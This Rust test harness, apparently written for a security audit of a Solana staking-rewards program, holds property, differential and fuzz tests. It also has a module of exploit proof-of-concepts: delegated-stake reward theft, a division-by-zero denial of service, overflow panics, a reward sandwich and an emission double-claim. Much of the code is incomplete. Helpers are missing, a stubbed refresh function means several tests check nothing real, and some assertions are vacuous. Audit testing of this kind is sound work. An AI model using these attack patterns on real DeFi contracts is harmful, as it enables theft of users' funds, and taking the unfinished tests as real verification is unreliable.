// Phase 6: Test Harness and Property Tests

use anchor_lang::prelude::*;
use proptest::prelude::*;
use farms::farm_operations;
use farms::state::{FarmState, UserState, RewardInfo};
use decimal_wad::decimal::Decimal;

// ============================================================================
// PROPERTY TESTS
// ============================================================================

proptest! {
    /// P1: Conservation of Rewards
    /// Total distributed ≤ Total added (with bounded rounding error)
    #[test]
    fn prop_reward_conservation(
        emissions in 0u128..1_000_000_000u128,
        users in 1usize..100,
        steps in 1u32..1000,
    ) {
        let mut farm = setup_farm(emissions);
        let mut total_claimed = 0u128;
        
        for _ in 0..steps {
            simulate_step(&mut farm, users);
            total_claimed += harvest_all_users(&mut farm);
        }
        
        let total_emitted = calculate_total_emitted(&farm);
        let max_rounding_error = users as u128 * steps as u128;
        
        prop_assert!(
            total_claimed <= total_emitted + max_rounding_error,
            "Conservation violated: claimed {} > emitted {} + error {}",
            total_claimed, total_emitted, max_rounding_error
        );
    }

    /// P2: Monotonicity of Cumulative Reward Per Share
    /// C[t] ≥ C[t-1] for all t
    #[test]
    fn prop_reward_per_share_monotonic(
        initial_rps in 0u128..u128::MAX/2,
        rewards in 0u64..1_000_000,
        total_stake in 1u128..1_000_000_000u128,
    ) {
        let mut farm = FarmState::default();
        farm.total_active_stake_scaled = total_stake;
        farm.reward_infos[0].reward_per_share_scaled = initial_rps;
        
        let prev_rps = farm.reward_infos[0].reward_per_share_scaled;
        
        // Add rewards and update
        farm.reward_infos[0].rewards_available = rewards;
        refresh_rewards(&mut farm, 100);
        
        let new_rps = farm.reward_infos[0].reward_per_share_scaled;
        
        prop_assert!(
            new_rps >= prev_rps,
            "RPS decreased: {} -> {}",
            prev_rps, new_rps
        );
    }

    /// P3: No Division by Zero
    /// Operations must handle total_stake = 0 gracefully
    #[test]
    fn prop_no_division_by_zero(
        rewards in 0u64..1_000_000,
        timestamp in 0u64..1_000_000,
    ) {
        let mut farm = FarmState::default();
        farm.total_active_stake_scaled = 0; // Zero stake!
        farm.reward_infos[0].rewards_available = rewards;
        
        // This should not panic
        let result = std::panic::catch_unwind(|| {
            refresh_rewards(&mut farm, timestamp);
        });
        
        prop_assert!(result.is_ok(), "Division by zero occurred");
    }

    /// P4: Delegated Stake Bounds
    /// User stakes must remain within reasonable bounds
    #[test]
    fn prop_delegated_stake_bounds(
        operations in prop::collection::vec(
            (0u64..u64::MAX, 0u64..1000),
            1..100
        )
    ) {
        let mut farm = create_delegated_farm();
        let mut user = UserState::default();
        
        for (new_stake, timestamp) in operations {
            set_delegated_stake(&mut farm, &mut user, new_stake, timestamp);
            
            prop_assert!(
                farm.total_active_stake_scaled <= u128::MAX / 2,
                "Total stake overflow risk"
            );
        }
    }
}

// ============================================================================
// EXPLOIT PROOF-OF-CONCEPTS
// ============================================================================

#[cfg(test)]
mod exploits {
    use super::*;

    /// POC: Delegated Stake Attack
    /// Demonstrates arbitrary reward theft via unvalidated external points
    #[test]
    fn exploit_delegated_stake_theft() {
        let mut farm = create_delegated_farm();
        let mut attacker = UserState::default();
        let mut victim = UserState::default();
        
        // Setup: Add 1M rewards to pool
        farm.reward_infos[0].rewards_available = 1_000_000;
        
        // Attack: Set massive stake without tokens
        let fake_stake = u64::MAX;
        set_delegated_stake(&mut farm, &mut attacker, fake_stake, 100);
        
        // Victim stakes legitimately (small amount)
        stake_tokens(&mut farm, &mut victim, 100, 100);
        
        // Refresh rewards
        refresh_rewards(&mut farm, 200);
        
        // Attacker harvests
        let stolen = harvest_rewards(&mut farm, &mut attacker, 0);
        
        // Attacker gets almost all rewards despite no real tokens
        assert!(stolen > 999_000, "Attack failed: only stole {}", stolen);
        
        println!("💀 CRITICAL: Attacker stole {} rewards with no tokens!", stolen);
    }

    /// POC: Division by Zero DoS
    /// Demonstrates how zero total stake causes panic
    #[test]
    #[should_panic(expected = "division by zero")]
    fn exploit_division_by_zero_dos() {
        let mut farm = create_delegated_farm();
        farm.total_active_stake_scaled = 0;
        farm.reward_infos[0].rewards_available = 1000;
        
        // This will panic with division by zero
        refresh_rewards_unsafe(&mut farm, 100);
    }

    /// POC: Decimal Overflow Panic
    /// Shows how large decimal values cause panics
    #[test]
    #[should_panic]
    fn exploit_decimal_overflow_panic() {
        let mut user = UserState::default();
        
        // Create decimal that will overflow on conversion
        let evil_decimal = Decimal::from_scaled_val(u128::MAX);
        
        // This panics with unwrap
        user.set_active_stake_decimal(evil_decimal);
    }

    /// POC: Reward Sandwich Attack
    /// Front-run reward additions to capture value
    #[test]
    fn exploit_reward_sandwich() {
        let mut farm = create_farm();
        let mut attacker = UserState::default();
        let mut honest_user = UserState::default();
        
        // Honest user has long-term stake
        stake_tokens(&mut farm, &mut honest_user, 1000, 0);
        
        // Attacker monitors mempool, sees incoming add_rewards(10000)
        
        // Front-run: Attacker stakes large amount
        stake_tokens(&mut farm, &mut attacker, 99000, 99);
        
        // Add rewards executes
        add_rewards(&mut farm, 10000, 100);
        refresh_rewards(&mut farm, 100);
        
        // Back-run: Attacker immediately harvests and withdraws
        let stolen = harvest_rewards(&mut farm, &mut attacker, 0);
        unstake_tokens(&mut farm, &mut attacker, 99000, 101);
        
        // Attacker captured most of the rewards
        assert!(stolen > 9000, "Sandwich attack captured: {}", stolen);
        
        println!("🥪 Sandwich attack stole {} of 10000 rewards", stolen);
    }

    /// POC: Emission Schedule Double-Spend
    /// Exploit emission rate changes to claim extra rewards
    #[test]
    fn exploit_emission_double_spend() {
        let mut farm = create_farm();
        let mut user = UserState::default();
        
        // Initial rate: 100/second
        set_emission_rate(&mut farm, 0, 100);
        stake_tokens(&mut farm, &mut user, 1000, 0);
        
        // Time passes...
        refresh_rewards(&mut farm, 50);
        
        // Admin changes rate to 200/second WITHOUT refreshing first
        set_emission_rate_unsafe(&mut farm, 0, 200);
        
        // Refresh with new rate but old timestamp
        refresh_rewards(&mut farm, 100);
        
        let rewards = harvest_rewards(&mut farm, &mut user, 0);
        
        // User got 200*100 instead of 100*50 + 200*50
        assert!(rewards > 15000, "Double-spend rewards: {}", rewards);
        
        println!("💰 Double-spend exploit: {} extra rewards", rewards - 10000);
    }
}

// ============================================================================
// DIFFERENTIAL TESTING
// ============================================================================

/// Reference implementation with high precision
mod reference {
    use rust_decimal::Decimal as HighPrecisionDecimal;
    
    pub struct ReferenceFarm {
        total_stake: HighPrecisionDecimal,
        reward_per_share: HighPrecisionDecimal,
        rewards_available: HighPrecisionDecimal,
    }
    
    impl ReferenceFarm {
        pub fn distribute_rewards(&mut self, amount: HighPrecisionDecimal) {
            if self.total_stake > HighPrecisionDecimal::ZERO {
                let added_rps = amount / self.total_stake;
                self.reward_per_share += added_rps;
                self.rewards_available -= amount;
            }
        }
        
        pub fn calculate_user_rewards(
            &self,
            user_stake: HighPrecisionDecimal,
            user_debt: HighPrecisionDecimal,
        ) -> HighPrecisionDecimal {
            user_stake * self.reward_per_share - user_debt
        }
    }
}

/// Compare on-chain vs reference implementation
#[test]
fn differential_test_reward_calculation() {
    let test_cases = vec![
        (1000u128, 100u64, 10u128),
        (u128::MAX / 2, 1, 1),
        (1, u64::MAX, u128::MAX / 2),
    ];
    
    for (total_stake, rewards, user_stake) in test_cases {
        let mut chain_farm = create_farm();
        chain_farm.total_active_stake_scaled = total_stake;
        
        let mut ref_farm = reference::ReferenceFarm {
            total_stake: total_stake.into(),
            reward_per_share: 0.into(),
            rewards_available: rewards.into(),
        };
        
        // Distribute rewards in both
        chain_distribute_rewards(&mut chain_farm, rewards);
        ref_farm.distribute_rewards(rewards.into());
        
        // Calculate user rewards in both
        let chain_rewards = chain_calculate_user_rewards(&chain_farm, user_stake);
        let ref_rewards = ref_farm.calculate_user_rewards(user_stake.into(), 0.into());
        
        // Compare with tolerance for rounding
        let diff = (chain_rewards as i128 - ref_rewards.to_i128().unwrap()).abs();
        assert!(
            diff <= 1,
            "Differential test failed: chain={} ref={} diff={}",
            chain_rewards, ref_rewards, diff
        );
    }
}

// ============================================================================
// FUZZING TARGETS
// ============================================================================

#[cfg(fuzzing)]
mod fuzz_targets {
    use libfuzzer_sys::fuzz_target;
    
    fuzz_target!(|data: &[u8]| {
        if data.len() < 32 { return; }
        
        let mut farm = FarmState::default();
        let mut user = UserState::default();
        
        // Parse fuzz input into operations
        let ops = parse_operations(data);
        
        for op in ops {
            match op {
                Op::Stake(amount) => stake(&mut farm, &mut user, amount),
                Op::Unstake(amount) => unstake(&mut farm, &mut user, amount),
                Op::Harvest(idx) => harvest(&mut farm, &mut user, idx),
                Op::AddRewards(amount) => add_rewards(&mut farm, amount),
                Op::SetDelegated(amount) => set_delegated(&mut farm, &mut user, amount),
                Op::Refresh(time) => refresh(&mut farm, time),
            }
            
            // Check invariants after each operation
            assert_invariants(&farm, &user);
        }
    });
    
    fn assert_invariants(farm: &FarmState, user: &UserState) {
        // I1: Non-negativity
        assert!(farm.total_active_stake_scaled >= 0);
        assert!(user.active_stake_scaled >= 0);
        
        // I2: User stake <= Total stake
        assert!(user.active_stake_scaled <= farm.total_active_stake_scaled);
        
        // I3: Reward per share monotonic
        // (checked in operation history)
        
        // I4: No overflow
        assert!(farm.total_active_stake_scaled < u128::MAX / 2);
    }
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

fn create_farm() -> FarmState {
    let mut farm = FarmState::default();
    farm.num_reward_tokens = 1;
    farm
}

fn create_delegated_farm() -> FarmState {
    let mut farm = create_farm();
    farm.delegate_authority = Pubkey::new_unique();
    farm.is_farm_delegated = 1;
    farm
}

fn refresh_rewards(farm: &mut FarmState, timestamp: u64) {
    // Safe implementation with zero-stake check
    if farm.total_active_stake_scaled == 0 {
        farm.reward_infos[0].last_issuance_ts = timestamp;
        return;
    }
    // ... rest of refresh logic
}

fn refresh_rewards_unsafe(farm: &mut FarmState, timestamp: u64) {
    // Unsafe version that panics on zero stake (for testing)
    let added_rps = farm.reward_infos[0].rewards_available as u128 
        / farm.total_active_stake_scaled; // BOOM!
    farm.reward_infos[0].reward_per_share_scaled += added_rps;
}